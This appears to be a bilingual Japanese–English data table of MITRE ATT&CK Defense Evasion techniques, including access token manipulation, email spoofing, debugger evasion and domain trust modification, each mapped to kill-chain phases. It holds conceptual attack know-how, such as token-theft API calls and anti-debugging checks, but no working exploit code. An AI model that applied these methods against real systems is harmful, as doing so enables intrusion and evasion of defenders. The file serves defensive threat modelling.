Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1134,アクセストークン操作,Access Token Manipulation,"攻撃者は、アクションを実行しアクセス制御をバイパスするために、異なるユーザーまたはシステムのセキュリティコンテキストで動作するようにアクセストークンを変更する可能性があります。Windowsはアクセストークンを使用して、実行中のプロセスの所有権を決定します。ユーザーはアクセストークンを操作して、実行中のプロセスを別のプロセスのサブプロセスであるかのように見せかけたり、プロセスを開始したユーザー以外の誰かに属しているかのように見せかけたりすることができます。これが発生すると、プロセスは新しいトークンに関連付けられたセキュリティコンテキストも引き継ぎます。

攻撃者は、組み込みのWindows API関数を使用して既存のプロセスからアクセストークンをコピーできます。これはトークン窃取として知られています。これらのトークンは、既存のプロセスに適用したり（つまり、[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)）、新しいプロセスを生成するために使用したり（つまり、[トークンを使用したプロセスの作成](https://attack.mitre.org/techniques/T1134/002)）できます。攻撃者は、トークンを盗むためには既に特権ユーザーコンテキスト（つまり管理者）である必要があります。ただし、攻撃者は一般的に、管理者レベルからSYSTEMレベルにセキュリティコンテキストを昇格させるためにトークン窃取を使用します。アカウントがリモートシステム上で適切な権限を持っている場合、攻撃者はトークンを使用してそのトークンのアカウントとしてリモートシステムに認証できます。(引用: Pentestlab Token Manipulation)

標準ユーザーは誰でも、<code>runas</code>コマンドおよびWindows API関数を使用して偽装トークンを作成できます。管理者アカウントへのアクセスは必要ありません。Active Directoryフィールドなど、アクセストークンを変更するために使用できる他のメカニズムもあります。","Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.

An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)

Any standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",T1134.002,トークンを使用したプロセスの作成,Create Process with Token,"攻撃者は、既存のトークンを使用して新しいプロセスを作成し、権限を昇格させアクセス制御をバイパスする可能性があります。プロセスは、<code>CreateProcessWithTokenW</code>や<code>runas</code>などの機能を使用して、別のユーザーのトークンと結果のセキュリティコンテキストで作成できます。(引用: Microsoft RunAs)

現在のユーザーに関連付けられていないトークンを使用してプロセスを作成するには、ターゲットユーザーの資格情報、そのユーザーを偽装するための特定の権限、または使用するトークンへのアクセスが必要になる場合があります。例えば、トークンは[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)によって複製されたり、[トークンの作成と偽装](https://attack.mitre.org/techniques/T1134/003)によって作成されたりしてから、プロセスを作成するために使用されることがあります。

このテクニックは[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)とは異なりますが、トークンが複製されてから新しいプロセスの作成に使用される場合には、これらのテクニックを組み合わせて使用できます。","Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)

Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.

While this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1134,アクセストークン操作,Access Token Manipulation,"攻撃者は、アクションを実行しアクセス制御をバイパスするために、異なるユーザーまたはシステムのセキュリティコンテキストで動作するようにアクセストークンを変更する可能性があります。Windowsはアクセストークンを使用して、実行中のプロセスの所有権を決定します。ユーザーはアクセストークンを操作して、実行中のプロセスを別のプロセスのサブプロセスであるかのように見せかけたり、プロセスを開始したユーザー以外の誰かに属しているかのように見せかけたりすることができます。これが発生すると、プロセスは新しいトークンに関連付けられたセキュリティコンテキストも引き継ぎます。

攻撃者は、組み込みのWindows API関数を使用して既存のプロセスからアクセストークンをコピーできます。これはトークン窃取として知られています。これらのトークンは、既存のプロセスに適用したり（つまり、[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)）、新しいプロセスを生成するために使用したり（つまり、[トークンを使用したプロセスの作成](https://attack.mitre.org/techniques/T1134/002)）できます。攻撃者は、トークンを盗むためには既に特権ユーザーコンテキスト（つまり管理者）である必要があります。ただし、攻撃者は一般的に、管理者レベルからSYSTEMレベルにセキュリティコンテキストを昇格させるためにトークン窃取を使用します。アカウントがリモートシステム上で適切な権限を持っている場合、攻撃者はトークンを使用してそのトークンのアカウントとしてリモートシステムに認証できます。(引用: Pentestlab Token Manipulation)

標準ユーザーは誰でも、<code>runas</code>コマンドおよびWindows API関数を使用して偽装トークンを作成できます。管理者アカウントへのアクセスは必要ありません。Active Directoryフィールドなど、アクセストークンを変更するために使用できる他のメカニズムもあります。","Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.

An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)

Any standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",T1134.003,トークンの作成と偽装,Make and Impersonate Token,"攻撃者は新しいトークンを作成し、ユーザーを偽装して権限を昇格させ、アクセス制御をバイパスする可能性があります。例えば、攻撃者がユーザー名とパスワードを持っているが、ユーザーがシステムにログオンしていない場合、攻撃者は`LogonUser`関数を使用してユーザーのログオンセッションを作成できます。(引用: LogonUserW function) この関数は新しいセッションのアクセストークンのコピーを返し、攻撃者は`SetThreadToken`を使用してトークンをスレッドに割り当てることができます。

この動作は、既存のトークンを盗んだり複製したりするのではなく、新しいユーザートークンを作成することを指すため、[トークン偽装/窃取](https://attack.mitre.org/techniques/T1134/001)とは異なります。","Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function.(Citation: LogonUserW function) The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.

This behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) in that this refers to creating a new user token instead of stealing or duplicating an existing one.",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1672,メールスプーフィング,Email Spoofing,"攻撃者は、偽の口実で被害者と接触を確立するために、関連するメールヘッダーの値を変更することにより、送信者のIDを偽装、つまりスプーフィングする可能性があります。(引用: Proofpoint TA427 April 2024) 実際のメールコンテンツに加えて、メールヘッダー（送信者のメールアドレスを含むFROMヘッダーなど）も変更される可能性があります。メールクライアントは、メールが被害者の受信トレイに表示されるときにこれらのヘッダーを表示するため、変更されたメールはスプーフィングされたエンティティからのものであるかのように見える可能性があります。

この動作は、スプーフィングされたエンティティがSender Policy Framework (SPF)、DomainKeys Identified Mail (DKIM)、および/またはDomain-based Message Authentication, Reporting and Conformance (DMARC)などのID認証ツールを有効にしていないか、強制していない場合に成功する可能性があります。(引用: Cloudflare DMARC, DKIM, and SPF)(引用: DMARC-overview)(引用: Proofpoint-DMARC) SPFとDKIMが適切に構成されていても、ドメインが`v=DMARC1; p=none; fo=1;`などの弱いDMARCポリシーを設定している場合、スプーフィングは依然として成功する可能性があります。これは、DMARCが技術的に存在していても、メールサーバーが認証チェックに失敗したメールに対してフィルタリングアクションを実行するように指示されていないことを意味します。(引用: Proofpoint TA427 April 2024)(引用: ic3-dprk)

攻撃者は、不在または弱く構成されたSPF、DKIM、および/またはDMARCポリシーを悪用して、[フィッシング](https://attack.mitre.org/techniques/T1566)などのソーシャルエンジニアリングの試みを隠蔽する可能性があります。(引用: ic3-dprk) また、ジャーナリストや学者など、正当な外部の個人や組織の[なりすまし](https://attack.mitre.org/techniques/T1656)のためにメールスプーフィングを利用する可能性もあります。(引用: ic3-dprk)","Adversaries may fake, or spoof, a sender’s identity by modifying the value of relevant email headers in order to establish contact with victims under false pretenses.(Citation: Proofpoint TA427 April 2024) In addition to actual email content, email headers (such as the FROM header, which contains the email address of the sender) may also be modified. Email clients display these headers when emails appear in a victim's inbox, which may cause modified emails to appear as if they were from the spoofed entity.

This behavior may succeed when the spoofed entity either does not enable or enforce identity authentication tools such as Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and/or Domain-based Message Authentication, Reporting and Conformance (DMARC).(Citation: Cloudflare DMARC, DKIM, and SPF)(Citation: DMARC-overview)(Citation: Proofpoint-DMARC) Even if SPF and DKIM are configured properly, spoofing may still succeed when a domain sets a weak DMARC policy such as `v=DMARC1; p=none; fo=1;`. This means that while DMARC is technically present, email servers are not instructed to take any filtering action when emails fail authentication checks.(Citation: Proofpoint TA427 April 2024)(Citation: ic3-dprk)

Adversaries may abuse absent or weakly configured SPF, SKIM, and/or DMARC policies to conceal social engineering attempts(Citation: ic3-dprk) such as [Phishing](https://attack.mitre.org/techniques/T1566). They may also leverage email spoofing for [Impersonation](https://attack.mitre.org/techniques/T1656) of legitimate external individuals and organizations, such as journalists and academics.(Citation: ic3-dprk)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1622,デバッガ回避,Debugger Evasion,"攻撃者は、デバッガを検出して回避するためにさまざまな手段を用いる可能性があります。デバッガは通常、防御側が潜在的なマルウェアペイロードの実行をトレースおよび/または分析するために使用します。(引用: ProcessHacker Github)

デバッガ回避には、デバッグ環境を示すアーティファクトの存在のチェック結果に基づいて動作を変更することが含まれる場合があります。[仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)と同様に、攻撃者がデバッガを検出した場合、マルウェアを変更して被害者から切り離したり、インプラントのコア機能を隠したりする可能性があります。また、セカンダリペイロードまたは追加ペイロードをドロップする前にデバッガアーティファクトを検索することもあります。

特定のチェックは、ターゲットおよび/または敵対者によって異なります。Windowsでは、これには<code>IsDebuggerPresent()</code>や<code>NtQueryInformationProcess()</code>などの[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数呼び出し、またはプロセス環境ブロック（PEB）の<code>BeingDebugged</code>フラグの手動チェックが含まれる場合があります。Linuxでは、これには`/proc/self/status`の<code>TracerPID</code>フィールドのクエリが含まれる場合があり、これはプロセスが動的分析ツールによってトレースされているかどうかを示します。(引用: Cado Security P2PInfect 2023)(引用: Positive Technologies Hellhounds 2023) デバッグアーティファクトの他のチェックでは、ハードウェアブレークポイント、割り込みアセンブリオペコード、時間チェック、または現在のプロセスで例外が発生した場合の測定（存在するデバッガーが潜在的なエラーを「飲み込む」または処理すると仮定）を列挙しようとする場合もあります。(引用: hasherezade debug)(引用: AlKhaser Debug)(引用: vxunderground debug)

マルウェアはまた、構造化例外処理（SEH）を利用して、例外をスローし、プロセスが中断されているかどうかを検出することにより、デバッガーを検出する可能性があります。SEHはハードウェアとソフトウェアの両方の期待値を処理し、デバッグのサポートを含む例外の制御を提供します。デバッガーが存在する場合、プログラムの制御はデバッガーに移り、コードの実行は中断されます。デバッガーが存在しない場合、制御はSEHハンドラーに移り、例外を自動的に処理してプログラムの実行を継続させます。(引用: Apriorit)

攻撃者は、これらのデバッガチェックから学習した情報を自動検出中に使用して、その後の動作を形成する可能性があります。デバッガはまた、プロセスを切り離したり、<code>OutputDebugStringW()</code>などの[ネイティブAPI](https://attack.mitre.org/techniques/T1106)関数呼び出しをループさせることによって生成されるメッセージを介してデバッグログを無意味なデータであふれさせたりすることによって回避できます。(引用: wardle evilquest partii)(引用: Checkpoint Dridex Jan 2021)","Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.(Citation: ProcessHacker Github)

Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497), if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.

Specific checks will vary based on the target and/or adversary. On Windows, this may involve [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>IsDebuggerPresent()</code> and <code> NtQueryInformationProcess()</code>, or manually checking the <code>BeingDebugged</code> flag of the Process Environment Block (PEB). On Linux, this may involve querying `/proc/self/status` for the `TracerPID` field, which indicates whether or not the process is being traced by dynamic analysis tools.(Citation: Cado Security P2PInfect 2023)(Citation: Positive Technologies Hellhounds 2023) Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would “swallow” or handle the potential error).(Citation: hasherezade debug)(Citation: AlKhaser Debug)(Citation: vxunderground debug)

Malware may also leverage Structured Exception Handling (SEH) to detect debuggers by throwing an exception and detecting whether the process is suspended. SEH handles both hardware and software expectations, providing control over the exceptions including support for debugging. If a debugger is present, the program’s control will be transferred to the debugger, and the execution of the code will be suspended. If the debugger is not present, control will be transferred to the SEH handler, which will automatically handle the exception and allow the program’s execution to continue.(Citation: Apriorit)

Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping [Native API](https://attack.mitre.org/techniques/T1106) function calls such as <code>OutputDebugStringW()</code>.(Citation: wardle evilquest partii)(Citation: Checkpoint Dridex Jan 2021)",,,,,,5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1484,ドメインまたはテナントポリシーの変更,Domain or Tenant Policy Modification,"攻撃者は、ドメインまたはIDテナントの構成設定を変更して、一元管理された環境で防御を回避したり権限を昇格させたりする可能性があります。このようなサービスは、デバイスやアカウントなどのIDリソースを管理するための一元的な手段を提供し、多くの場合、信頼関係、ID同期、IDフェデレーションなど、ドメイン間またはテナント間に適用される可能性のある構成設定を含みます。

ドメインまたはテナント設定の変更には、Microsoft Active Directory (AD)のドメイングループポリシーオブジェクト(GPO)の変更や、ドメインまたはテナント間のフェデレーショントラスト関係を含むドメインのトラスト設定の変更が含まれる場合があります。

十分な権限があれば、攻撃者はドメインまたはテナントポリシー設定を変更できます。これらのサービスの構成設定は多数のIDリソースに適用されるため、この悪用から生じる可能性のある潜在的な攻撃の悪意のある結果は多数あります。このような悪用の例としては、次のようなものがあります：

* ドメイン環境全体のコンピュータに悪意のある[スケジュールタスク](https://attack.mitre.org/techniques/T1053/005)をプッシュするためのGPOの変更(引用: ADSecurity GPO Persistence 2016)(引用: Wald0 Guide to GPOs)(引用: Harmj0y Abusing GPO Permissions)
* 攻撃者が制御するドメインを含めるためのドメイン信頼関係の変更。これにより、攻撃者は被害者ドメインリソースによって後で受け入れられるアクセストークンを偽造できるようになります(引用: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)
* [不正なドメインコントローラー](https://attack.mitre.org/techniques/T1207)を実装するためのAD環境内の構成設定の変更。
* 新しい、攻撃者が制御するフェデレーションIDプロバイダーをIDテナントに追加し、攻撃者が被害者テナントによって管理されている任意のユーザーとして認証できるようにします。(引用: Okta Cross-Tenant Impersonation 2023)

攻撃者は、ドメインまたはテナントポリシーを一時的に変更し、悪意のあるアクションを実行した後、変更を元に戻して疑わしいインジケータを削除する可能性があります。","Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.

Modifications to domain or tenant settings may include altering domain Group Policy Objects (GPOs) in Microsoft Active Directory (AD) or changing trust settings for domains, including federation trusts relationships between domains or tenants.

With sufficient permissions, adversaries can modify domain or tenant policy settings. Since configuration settings for these services apply to a large number of identity resources, there are a great number of potential attacks malicious outcomes that can stem from this abuse. Examples of such abuse include:

* modifying GPOs to push a malicious [Scheduled Task](https://attack.mitre.org/techniques/T1053/005) to computers throughout the domain environment(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)
* modifying domain trusts to include an adversary-controlled domain, allowing adversaries to  forge access tokens that will subsequently be accepted by victim domain resources(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)
* changing configuration settings within the AD environment to implement a [Rogue Domain Controller](https://attack.mitre.org/techniques/T1207).
* adding new, adversary-controlled federated identity providers to identity tenants, allowing adversaries to authenticate as any user managed by the victim tenant (Citation: Okta Cross-Tenant Impersonation 2023)

Adversaries may temporarily modify domain or tenant policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",T1484.002,信頼関係の変更,Trust Modification,"攻撃者は、新しいドメイン信頼を追加したり、既存のドメイン信頼のプロパティを変更したり、あるいはドメインとテナント間の信頼関係の構成をその他の方法で変更して、防御を回避したり権限を昇格させたりする可能性があります。ユーザーIDがフェデレーションされているかどうかなどの信頼の詳細は、共有リソースへのアクセスの目的でドメイン間またはテナント間に認証および承認プロパティを適用できるようにします。(引用: Microsoft - Azure AD Federation) これらの信頼オブジェクトには、アカウント、資格情報、およびサーバー、トークン、ドメインに適用されるその他の認証マテリアルが含まれる場合があります。

これらの信頼関係を操作することにより、攻撃者は、制御するオブジェクトを追加するように設定を変更することで、権限を昇格させたり防御を回避したりできる可能性があります。例えば、Microsoft Active Directory (AD) 環境では、署名証明書を侵害して新しい資格情報を偽造する必要なく、[SAMLトークン](https://attack.mitre.org/techniques/T1606/002)を偽造するためにこれを使用できます。代わりに、攻撃者はドメイン信頼関係を操作して独自の署名証明書を追加できます。攻撃者はまた、Active Directory Federation Services (AD FS) を使用してADドメインをフェデレーションドメインに変換することもでき、これにより、指定されたユーザーとして任意の有効な資格情報セットでログインするためのクレーム発行規則の変更など、悪意のある信頼関係の変更が可能になる場合があります。(引用: AADInternals zure AD Federated Domain)

攻撃者はまた、OktaやAWS IAM Identity CenterなどのIDテナントに新しいフェデレーションIDプロバイダーを追加する可能性があり、これにより攻撃者はテナントの任意のユーザーとして認証できるようになる可能性があります。(引用: Okta Cross-Tenant Impersonation 2023) これにより、脅威アクターはIDテナントを利用するさまざまなクラウドベースのサービスへの広範なアクセスを取得できる可能性があります。例えば、AWS環境では、AWS組織の新しいIDプロバイダーを作成する攻撃者は、各メンバーアカウントのIDを作成することなく、すべてのAWS組織メンバーアカウントにフェデレーションできるようになります。(引用: AWS RE:Inforce Threat Detection 2024)","Adversaries may add new domain trusts, modify the properties of existing domain trusts, or otherwise change the configuration of trust relationships between domains and tenants to evade defenses and/or elevate privileges.Trust details, such as whether or not user identities are federated, allow authentication and authorization properties to apply between domains or tenants for the purpose of accessing shared resources.(Citation: Microsoft - Azure AD Federation) These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.

Manipulating these trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, in Microsoft Active Directory (AD) environments, this may be used to forge [SAML Tokens](https://attack.mitre.org/techniques/T1606/002) without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate. An adversary may also convert an AD domain to a federated domain using Active Directory Federation Services (AD FS), which may enable malicious trust modifications such as altering the claim issuance rules to log in any valid set of credentials as a specified user.(Citation: AADInternals zure AD Federated Domain)

An adversary may also add a new federated identity provider to an identity tenant such as Okta or AWS IAM Identity Center, which may enable the adversary to authenticate as any user of the tenant.(Citation: Okta Cross-Tenant Impersonation 2023) This may enable the threat actor to gain broad access into a variety of cloud-based services that leverage the identity tenant. For example, in AWS environments, an adversary that creates a new identity provider for an AWS Organization will be able to federate into all of the AWS Organization member accounts without creating identities for each of the member accounts.(Citation: AWS RE:Inforce Threat Detection 2024)",5,Installation,Attacker installs malware or establishes persistent access on the compromised system. This allows the attacker to maintain control for future activities.,インストール,攻撃者は、侵害されたシステムにマルウェアをインストールするか、永続的なアクセスを確立します。これにより、攻撃者は将来の活動のために制御を維持できます。,6,Command and Control (C2),Attacker establishes a communication channel with the compromised system to remotely control it exfiltrate data or issue further commands.,コマンド＆コントロール (C2),攻撃者は、侵害されたシステムとの通信チャネルを確立し、リモートで制御したり、データを窃取したり、さらなるコマンドを発行したりします。,より高い権限レベルを獲得する活動。インストールフェーズで高権限を確保したり、C2確立後にさらなる権限昇格を試みたりする。
TA0005,防御回避,Defense Evasion,"攻撃者は検知を避けようとしています。

防御回避は、攻撃者が侵害全体を通じて検知を回避するために使用するテクニックで構成されます。防御回避に使用されるテクニックには、セキュリティソフトウェアのアンインストール/無効化、またはデータやスクリプトの難読化/暗号化が含まれます。攻撃者はまた、マルウェアを隠蔽し偽装するために、信頼されたプロセスを利用および悪用します。他の戦術のテクニックは、それらのテクニックが防御を破壊するという追加の利点を含む場合に、ここに相互リストされています。","The adversary is trying to avoid being detected.

Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses.",T1484,ドメインまたはテナントポリシーの変更,Domain or Tenant Policy Modification,"攻撃者は、ドメインまたはIDテナントの構成設定を変更して、一元管理された環境で防御を回避したり権限を昇格させたりする可能性があります。このようなサービスは、デバイスやアカウントなどのIDリソースを管理するための一元的な手段を提供し、多くの場合、信頼関係、ID同期、IDフェデレーションなど、ドメイン間またはテナント間に適用される可能性のある構成設定を含みます。

ドメインまたはテナント設定の変更には、Microsoft Active Directory (AD)のドメイングループポリシーオブジェクト(GPO)の変更や、ドメインまたはテナント間のフェデレーショントラスト関係を含むドメインのトラスト設定の変更が含まれる場合があります。

十分な権限があれば、攻撃者はドメインまたはテナントポリシー設定を変更できます。これらのサービスの構成設定は多数のIDリソースに適用されるため、この悪用から生じる可能性のある潜在的な攻撃の悪意のある結果は多数あります。このような悪用の例としては、次のようなものがあります：

* ドメイン環境全体のコンピュータに悪意のある[スケジュールタスク](https://attack.mitre.org/techniques/T1053/005)をプッシュするためのGPOの変更(引用: ADSecurity GPO Persistence 2016)(引用: Wald0 Guide to GPOs)(引用: Harmj0y Abusing GPO Permissions)
* 攻撃者が制御するドメインを含めるためのドメイン信頼関係の変更。これにより、攻撃者は被害者ドメインリソースによって後で受け入れられるアクセストークンを偽造できるようになります(引用: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks)
* [不正なドメインコントローラー](https://attack.mitre.org/techniques/T1207)を実装するためのAD環境内の構成設定の変更。
* 新しい、攻撃者が制御するフェデレーションIDプロバイダーをIDテナントに追加し、攻撃者が被害者テナントによって管理されている任意のユーザーとして認証できるようにします。(引用: Okta Cross-Tenant Impersonation 2023)

攻撃者は、ドメインまたはテナントポリシーを一時的に変更し、悪意のあるアクションを実行した後、変更を元に戻して疑わしいインジケータを削除する可能性があります。","Adversaries may modify the configuration settings of a domain or identity tenant to evade defenses and/or escalate privileges in centrally managed environments. Such services provide a centralized means of managing identity resources such as devices and accounts, and often include configuration settings that may apply between domains or tenants such as trust relationships, identity syncing, or identity federation.

